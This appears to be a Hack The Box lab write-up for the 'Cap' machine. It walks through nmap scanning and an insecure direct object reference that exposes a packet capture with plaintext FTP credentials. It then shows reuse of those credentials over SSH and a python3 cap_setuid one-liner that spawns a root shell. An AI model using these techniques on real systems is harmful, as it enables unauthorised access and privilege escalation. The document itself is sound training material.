
<div style="background: linear-gradient(90deg, #0d1117 0%, #16213e 100%); padding: 25px; border-radius: 15px; border: 2px solid #9acd32; font-family: 'Inter', sans-serif; color: white; display: flex; align-items: center; gap: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
<div style="flex-shrink: 0; width: 90px; height: 90px; border-radius: 50%; border: 3px solid #9acd32; overflow: hidden; display: flex; justify-content: center; align-items: center; background: #0d1117;">
<img src="Tought Process/!Media/!Logo_Cap.png" style="width: 100%; height: 100%; object-fit: cover;" onerror="this.src='https://www.hackthebox.com/storage/avatars/6aae4108848d5f493b26c68a4176953b.png'">
</div>
<div style="flex-grow: 1;">
<h1 style="margin: 0; font-size: 28px; color: #ffffff; text-transform: uppercase; letter-spacing: 2px;">Cap <span style="font-size: 12px; color: #9acd32; border: 1px solid #9acd32; padding: 2px 8px; border-radius: 4px; vertical-align: middle; margin-left: 10px;">PWNED</span></h1>
<div style="display: flex; gap: 20px; margin-top: 12px; font-size: 13px;">
<span><span style="color: #9acd32;">💻</span> <b>OS:</b> Linux</span>
<span><span style="color: #9acd32;">🔥</span> <b>Diff:</b> Easy</span>
<span><span style="color: #9acd32;">📅</span> <b>Pwned:</b> 21 Feb 2026</span>
</div>
</div>
<div style="text-align: right;">
<div style="font-size: 10px; text-transform: uppercase; color: #9acd32; margin-bottom: 5px; letter-spacing: 1px;">Primary Vector</div>
<code style="background: rgba(255, 255, 255, 0.05); padding: 6px 12px; border-radius: 5px; border: 1px solid #9acd32; color: #9acd32; font-size: 11px; font-weight: bold;">aaa</code>
</div>
</div>

For this Box, I started with the usual nmap. The scan outputted:

```zsh
sudo nmap -sU --top-ports 100 -n -Pn 10.129.1.93
```
```
Nmap scan report for 10.129.1.93
Host is up (0.043s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 115.82 seconds
```

```zsh
sudo nmap -sS --top-ports 100 -n -Pn 10.129.1.93  
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 06:37 WET  
Nmap scan report for 10.129.1.93  
Host is up (0.046s latency).  
Not shown: 97 closed tcp ports (reset)  
PORT   STATE SERVICE  
21/tcp open  ftp  
22/tcp open  ssh  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

We can see that we have an ftp, ssh, and http port opened. Lets check the http first:

![[Cap_1.png]]

It's a dashboard webapp. After analyzing the pages for a bit, we see that the "Security Snapshot" seems odd, since it's the only one that gives us a file (3.pcap):

![[Cap_3.png]]

The link of the page is "/3", what if we change it to "/0"?:

![[Cap_2.png]]

Looks like we are onto something. Downloading this file and dumping it into the terminal, we see the following:

```zsh
tcpdump -r 0.pcap  
```
```
reading from file 0.pcap, link-type LINUX_SLL (Linux cooked v1), snapshot length 262144  
14:12:49.958142 IP 192.168.196.1.54399 > 192.168.196.16.http: Flags [S], seq 2397486956, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0  
14:12:49.958169 IP 192.168.196.16.http > 192.168.196.1.54399: Flags [S.], seq 239420785, ack 2397486957, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0  
14:12:49.958332 IP 192.168.196.1.54399 > 192.168.196.16.http: Flags [.], ack 1, win 4106, length 0  
14:12:49.958383 IP 192.168.196.1.54399 > 192.168.196.16.http: Flags [P.], seq 1:399, ack 1, win 4106, length 398: HTTP: GET / HTTP/1.1  
14:12:49.958388 IP 192.168.196.16.http > 192.168.196.1.54399: Flags [.], ack 399, win 501, length 0  
14:12:49.959884 IP 192.168.196.16.http > 192.168.196.1.54399: Flags [P.], seq 1:18, ack 399, win 501, length 17: HTTP: HTTP/1.0 200 OK  
14:12:49.960000 IP 192.168.196.16.http > 192.168.196.1.54399: Flags [FP.], seq 18:1396, ack 399, win 501, length 1378: HTTP  
14:12:49.960263 IP 192.168.196.1.54399 > 192.168.196.16.http: Flags [.], ack 1397, win 4100, length 0  
14:12:49.960350 IP 192.168.196.1.54399 > 192.168.196.16.http: Flags [F.], seq 399, ack 1397, win 4100, length 0  
14:12:49.960364 IP 192.168.196.16.http > 192.168.196.1.54399: Flags [.], ack 400, win 501, length 0  
14:12:50.000377 IP 192.168.196.1.54400 > 192.168.196.16.http: Flags [S], seq 2604434004, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0  
14:12:50.000415 IP 192.168.196.16.http > 192.168.196.1.54400: Flags [S.], seq 4244414476, ack 2604434005, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0  
14:12:50.000613 IP 192.168.196.1.54400 > 192.168.196.16.http: Flags [.], ack 1, win 4106, length 0  
14:12:50.000671 IP 192.168.196.1.54400 > 192.168.196.16.http: Flags [P.], seq 1:361, ack 1, win 4106, length 360: HTTP: GET /static/main.css HTTP/1.1  
14:12:50.000677 IP 192.168.196.16.http > 192.168.196.1.54400: Flags [.], ack 361, win 501, length 0  
14:12:50.002467 IP 192.168.196.16.http > 192.168.196.1.54400: Flags [P.], seq 1:18, ack 361, win 501, length 17: HTTP: HTTP/1.0 200 OK  
14:12:50.002607 IP 192.168.196.16.http > 192.168.196.1.54400: Flags [FP.], seq 18:1009, ack 361, win 501, length 991: HTTP  
14:12:50.002901 IP 192.168.196.1.54400 > 192.168.196.16.http: Flags [.], ack 1010, win 4102, length 0  
14:12:50.003064 IP 192.168.196.1.54400 > 192.168.196.16.http: Flags [F.], seq 361, ack 1010, win 4102, length 0  
14:12:50.003079 IP 192.168.196.16.http > 192.168.196.1.54400: Flags [.], ack 362, win 501, length 0  
14:12:50.406059 IP 192.168.196.1.54410 > 192.168.196.16.http: Flags [S], seq 2049716514, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0  
14:12:50.406094 IP 192.168.196.16.http > 192.168.196.1.54410: Flags [S.], seq 2608738359, ack 2049716515, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0  
14:12:50.406277 IP 192.168.196.1.54410 > 192.168.196.16.http: Flags [.], ack 1, win 4106, length 0  
14:12:50.406347 IP 192.168.196.1.54410 > 192.168.196.16.http: Flags [P.], seq 1:353, ack 1, win 4106, length 352: HTTP: GET /favicon.ico HTTP/1.1  
14:12:50.406355 IP 192.168.196.16.http > 192.168.196.1.54410: Flags [.], ack 353, win 501, length 0  
14:12:50.407862 IP 192.168.196.16.http > 192.168.196.1.54410: Flags [P.], seq 1:25, ack 353, win 501, length 24: HTTP: HTTP/1.0 404 NOT FOUND  
14:12:50.408011 IP 192.168.196.16.http > 192.168.196.1.54410: Flags [FP.], seq 25:394, ack 353, win 501, length 369: HTTP  
14:12:50.408145 IP 192.168.196.1.54410 > 192.168.196.16.http: Flags [.], ack 395, win 4104, length 0  
14:12:50.408318 IP 192.168.196.1.54410 > 192.168.196.16.http: Flags [F.], seq 353, ack 395, win 4104, length 0  
14:12:50.408331 IP 192.168.196.16.http > 192.168.196.1.54410: Flags [.], ack 354, win 501, length 0  
14:12:52.582712 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [S], seq 1619097681, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0  
14:12:52.582766 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [S.], seq 455236821, ack 1619097682, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0  
14:12:52.583076 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 1, win 4106, length 0  
14:12:52.585037 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 1:21, ack 1, win 502, length 20: FTP: 220 (vsFTPd 3.0.3)  
14:12:52.625835 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 21, win 4106, length 0  
14:12:54.084642 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 1:14, ack 21, win 4106, length 13: FTP: USER nathan  
14:12:54.084668 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 14, win 502, length 0  
14:12:54.084772 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 21:55, ack 14, win 502, length 34: FTP: 331 Please specify the password.  
14:12:54.125843 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 55, win 4106, length 0  
14:12:55.383140 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 14:36, ack 55, win 4106, length 22: FTP: PASS Buck3tH4TF0RM3!  
14:12:55.383176 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 36, win 502, length 0  
14:12:55.390529 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 55:78, ack 36, win 502, length 23: FTP: 230 Login successful.  
14:12:55.390943 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 36:42, ack 78, win 4105, length 6: FTP: SYST  
14:12:55.390976 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 42, win 502, length 0  
14:12:55.391079 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 78:97, ack 42, win 502, length 19: FTP: 215 UNIX Type: L8  
14:12:55.436932 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 97, win 4105, length 0  
14:12:56.267770 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 42:70, ack 97, win 4105, length 28: FTP: PORT 192,168,196,1,212,140  
14:12:56.267797 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 70, win 502, length 0  
14:12:56.268016 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 97:148, ack 70, win 502, length 51: FTP: 200 PORT command successful. Consider using PASV.  
14:12:56.268656 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 70:76, ack 148, win 4105, length 6: FTP: LIST  
14:12:56.269195 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 148:187, ack 76, win 502, length 39: FTP: 150 Here comes the directory listing.  
14:12:56.269621 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 187:211, ack 76, win 502, length 24: FTP: 226 Directory send OK.  
14:12:56.269782 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 211, win 4105, length 0  
14:12:57.338913 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 76:104, ack 211, win 4105, length 28: FTP: PORT 192,168,196,1,212,141  
14:12:57.339140 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 211:262, ack 104, win 502, length 51: FTP: 200 PORT command successful. Consider using PASV.  
14:12:57.339696 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 104:114, ack 262, win 4105, length 10: FTP: LIST -al  
14:12:57.340307 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 262:301, ack 114, win 502, length 39: FTP: 150 Here comes the directory listing.  
14:12:57.340646 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 301:325, ack 114, win 502, length 24: FTP: 226 Directory send OK.  
14:12:57.340779 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 325, win 4104, length 0  
14:13:17.989210 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 114:122, ack 325, win 4104, length 8: FTP: TYPE I  
14:13:17.989363 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 325:356, ack 122, win 502, length 31: FTP: 200 Switching to Binary mode.  
14:13:17.989689 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 122:150, ack 356, win 4104, length 28: FTP: PORT 192,168,196,1,212,143  
14:13:17.989830 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 356:407, ack 150, win 502, length 51: FTP: 200 PORT command successful. Consider using PASV.  
14:13:17.990074 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 150:166, ack 407, win 4104, length 16: FTP: RETR notes.txt  
14:13:17.990214 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 407:433, ack 166, win 502, length 26: FTP: 550 Failed to open file.  
14:13:18.033053 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 433, win 4104, length 0  
14:13:21.085693 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 166:172, ack 433, win 4104, length 6: FTP: QUIT  
14:13:21.085794 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 433:447, ack 172, win 502, length 14: FTP: 221 Goodbye.  
14:13:21.085838 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [F.], seq 447, ack 172, win 502, length 0  
14:13:21.086194 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 448, win 4104, length 0  
14:13:21.086523 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [F.], seq 172, ack 448, win 4104, length 0  
14:13:21.086530 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 173, win 502, length 0
```

One thing catches the eye immediately in the middle of this network traffic:

```
14:12:54.084642 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 1:14, ack 21, win 4106, length 13: FTP: USER nathan  
14:12:54.084668 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 14, win 502, length 0  
14:12:54.084772 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 21:55, ack 14, win 502, length 34: FTP: 331 Please specify the password.  
14:12:54.125843 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 55, win 4106, length 0  
14:12:55.383140 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 14:36, ack 55, win 4106, length 22: FTP: PASS Buck3tH4TF0RM3!
```

And, below these, there are some ftp traffic. Let's try the ftp port now:

```zsh
ftp nathan@10.129.1.93  
```
```
Connected to 10.129.1.93.  
220 (vsFTPd 3.0.3)  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp>
```

Trying to get user.txt gives us the file with the user flag!:

```
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||6895|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***********************************************************************************************************************************************************************************************|    33      528.30 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.74 KiB/s)
ftp> exit
221 Goodbye.
```
```zsh
cat user.txt
75b696d471**********************
```

Lets test the same password on ssh as nathan and see if we can connect:

```zsh
ssh nathan@10.129.1.93
```
```
nathan@10.129.1.93's password:  
Last login: Thu May 27 11:21:27 2021 from 10.10.14.7  
nathan@cap:~$
```

We are going in an excellent path! Let's see if we can find anything odd:

```
nathan@cap:/tmp$ sudo -l
[sudo] password for nathan:
Sorry, user nathan may not run sudo on cap.
nathan@cap:/tmp$ which sudo
/usr/bin/sudo
nathan@cap:/tmp$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

Nothing unusual so far. But doing a "little" cheat, since this box is called "Cap", let's check if any file has some privileged capabilities:

```
nathan@cap:/tmp$ getcap -r / 2>/dev/null  
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip  
/usr/bin/ping = cap_net_raw+ep  
/usr/bin/traceroute6.iputils = cap_net_raw+ep  
/usr/bin/mtr-packet = cap_net_raw+ep  
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Python has the "cap_setuid" capability, which is vulnerable. This means we can run a python script and change our user ID:

```
nathan@cap:/tmp$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'  
root@cap:/tmp# cd ..  
root@cap:/# cd root  
root@cap:/root# cat root.txt  
74c5de1697**********************
```
